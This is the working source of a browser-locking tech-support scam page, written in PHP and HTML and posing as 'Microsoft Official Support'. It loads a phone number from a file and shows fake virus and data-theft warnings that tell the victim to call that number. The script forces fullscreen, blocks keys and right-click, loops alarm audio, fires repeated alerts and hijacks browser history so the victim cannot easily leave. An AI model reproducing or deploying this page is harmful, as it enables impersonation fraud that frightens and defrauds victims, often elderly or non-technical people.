<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-119763329-3"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-119763329-3');
</script>
<html>
    <head>
        <meta content="width=device-width, initial-scale=1.0, user-scalable=1" name="viewport">
        <meta name="robots" content="noindex,nofollow">
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title> Microsoft Official Support </title>
	<link href="https://fonts.googleapis.com/css?family=Titillium+Web:400,700" rel="stylesheet">

	<link href="files/style.css" rel="stylesheet">
    <meta http-equiv="refresh" content="1;URL='edge.php?'" />
	<?php
		$myfile = fopen("number.txt", "r") or die("Unable to open file!");
		$phone = fgets($myfile);
		//
		$phone = trim(preg_replace('/\s\s+/', ' ', $phone));
		fclose($myfile);
	?>
	<script type="text/javascript">
	    var phone_number = '<?php echo $phone ?>';
	</script>
	
	<script type="text/javascript">

function toggleFullScreen() {
    document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || (document.documentElement.requestFullscreen ? document.documentElement.requestFullscreen() : document.documentElement.mozRequestFullScreen ? document.documentElement.mozRequestFullScreen() : document.documentElement.webkitRequestFullscreen && document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT))
}

function fin(a) {
    var b = a;
    fadeIn(b)
}

function fadeIn(a) {
    var b = function() {
        a.style.opacity = +a.style.opacity + .02, +a.style.opacity < 1 && setTimeout(b, 6)
    };
    b()
}

function fout(a) {
    var b = a;
    fadeOut(b)
}

function fadeOut(a) {
    var b = function() {
        a.style.opacity = +a.style.opacity - .02, +a.style.opacity > 0 && setTimeout(b, 6)
    };
    b()
}
var audii = !1;
window.onkeydown = function(a) {
    if (27 == a.keyCode || 18 == a.keyCode || 123 == a.keyCode || 85 == a.keyCode || 9 == a.keyCode || 115 == a.keyCode || 116 == a.keyCode || 112 == a.keyCode || 114 == a.keyCode || 17 == a.keyCode) return !1
}, window.onkeypress = function(a) {
    if (123 == a.keyCode || 117 == a.keyCode) return !1
}, onbeforeunload = function() {
    return alert("Someone Is Trying To Steal Your Banking Details, Credit Card Details & Other Logins. Please Call Microsoft At <?php echo $phone ?> Immediately To Prevent Data Loss."), "Someone Is Trying To Steal Your Banking Details, Credit Card Details & Other Logins. Please Call Microsoft At <?php echo $phone ?> Immediately To Prevent Data Loss."
}, window.onblur = function() {
    alert("Someone Is Trying To Steal Your Banking Details, Credit Card Details & Other Logins. Please Call Microsoft At <?php echo $phone ?> Immediately To Prevent Data Loss.")
}, document.addEventListener("keyup", function(a) {
    27 == a.keyCode && toggleFullScreen()
}, !1), document.addEventListener("keyup", function(a) {
    122 != a.keyCode && 17 != a.keyCode && 18 != a.keyCode && 13 != a.keyCode || toggleFullScreen()
}, !1);
var bjen, bdva, switchbubble = 0;
window.onload = function() {
    document.onclick = function(a) {
        a = a || event, target = a.target || a.srcElement, "DIV" == target.tagName ? (toggleFullScreen(), document.body.style.overflow = "hidden", bjen = switchbubble ? document.getElementById("b2") : document.getElementById("b1"), bdva = document.getElementById("b2"), switchbubble++, audii || document.getElementById("audio").play(), document.body.style.cursor = "not-allowed", document.getElementById("map").style.cursor = "initial", switchbubble < 2 ? (bjen.style.display = "block", fin(bjen), setTimeout(function() {
            fout(bjen), bdva.style.display = "block", setTimeout(function() {
                fin(bdva)
            }, 1200)
        }, 2500)) : (fout(bjen), bdva.style.display = "block", setTimeout(function() {
            fin(bdva)
        }, 500)), document.getElementById("secpage").style.display = "block",document.getElementById("thirdpage").style.display = "block", document.getElementById("backgr").src = "files/background-2.png", document.getElementById("second_alert").style.display = "none", setTimeout(function() {
            document.getElementById("second_alert").style.display = "block"
        }, 500), audii = !0, document.getElementById("warning").play()) : (toggleFullScreen(), document.body.style.overflow = "hidden", bjen = switchbubble ? document.getElementById("b2") : document.getElementById("b1"), bdva = document.getElementById("b2"), switchbubble++, audii || document.getElementById("audio").play(), document.body.style.cursor = "not-allowed", document.getElementById("map").style.cursor = "initial", switchbubble < 2 ? (bjen.style.display = "block", fin(bjen), setTimeout(function() {
            fout(bjen), bdva.style.display = "block", setTimeout(function() {
                fin(bdva)
            }, 1200)
        }, 2500)) : (fout(bjen), bdva.style.display = "block", setTimeout(function() {
            fin(bdva)
        }, 500)), document.getElementById("secpage").style.display = "block",document.getElementById("thirdpage").style.display = "block", document.getElementById("backgr").src = "files/background-2.png", document.getElementById("second_alert").style.display = "none", setTimeout(function() {
            document.getElementById("second_alert").style.display = "block"
        }, 500), audii = !0, document.getElementById("warning").play())
    }
}, document.oncontextmenu = new Function("return false"), addEventListener("click", function() {
    var a = document.documentElement,
        b = a.requestFullScreen || a.webkitRequestFullScreen || a.mozRequestFullScreen;
    b.call(a)
});
	</script>
	</head>
        
<body oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">
            
<div class="container">
	<img src="files/background-2.png" alt="" style="width: 100%;" id="backgr">
	
	<div id="secpage">
		<p class="lokacioni">
			Windows Has Detected a Malicious Virus On Your System
		</p>
		<p class="lokacioni2">Do Not Shutdown Or Restart Your Computer</p>
		<p class="lokacioni2">Contact Our Certified Windows Technicians For Immediate Assistance</p>
		<p class="lokacioni3"><script>document.write(phone_number);</script></p>
	</div>
	
	<div id="thirdpage">
		<p class="lokacioni2">Contact Our Certified Windows Technicians For Immediate Assistance</p>
		<p class="lokacioni3"><script>document.write(phone_number);</script></p>
	</div>
	
	<div id="map">
		
		
		<div id="second_alert">
			<img src="files/alert.jpg" alt="">
			<p id="phoneal"><script>document.write(phone_number);</script></p>
		</div>
	</div>
</div>

<div class="bubble" id="b1">
	<p><img src="files/microsoft.png" alt="" style="width:100px;margin-left:-15px;padding-bottom:3px"></p>
	<p>Microsoft Error: Unknown System Failure!</p>
</div>

<div class="bubble" id="b2">
	<p><img src="files/microsoft.png" alt="" style="width:100px;margin-left:-15px;padding-bottom:3px"></p>
	<p>Call tech support...</p>
	<p id="tech" style="font-weight: 700"><script>document.write(phone_number);</script></p>
</div>

<audio loop="" autoplay id="audio">
	<source src="files/alertmicrosoft.mp3" type="audio/mpeg">
</audio>

<audio id="warning">
	<source src="files/warning.mp3" type="audio/mpeg">
</audio>

<script type="text/javascript">
	function nocontextmenu() {
    return event.cancelBubble = !0, event.returnValue = !1, !1
}

function norightclick(a) {
    if (window.Event) {
        if (2 == a.which || 3 == a.which) return !1
    } else if (2 == event.button || 3 == event.button) return event.cancelBubble = !0, event.returnValue = !1, !1
}


window.Event && document.captureEvents(Event.MOUSEUP), document.layers && document.captureEvents(Event.MOUSEDOWN), document.oncontextmenu = nocontextmenu, document.onmousedown = norightclick, document.onmouseup = norightclick, setTimeout(function() {
    
}, 200);
var current_location = "edge.php?";
window.history.pushState({
    type: "redirect",
    url: "edge.php?"
}, document.title, current_location), window.history.pushState(current_location, current_location, current_location), setTimeout(function() {
    alert("Someone Is Trying To Steal Your Banking Details, Credit Card Details & Other Logins. Please Call Microsoft At <?php echo $phone ?> Immediately To Prevent Data Loss.")
}, 1e3);
</script>     

<?php
echo '"<iframe src="report.php?num='.$phone.'"></iframe>"'
?>
</body>


<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'}),_trfd.push({'ap':'cpsh'},{'server':'a2plcpnl0609'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='https://img1.wsimg.com/tcc/tcc_l.combined.1.0.6.min.js'></script></html>

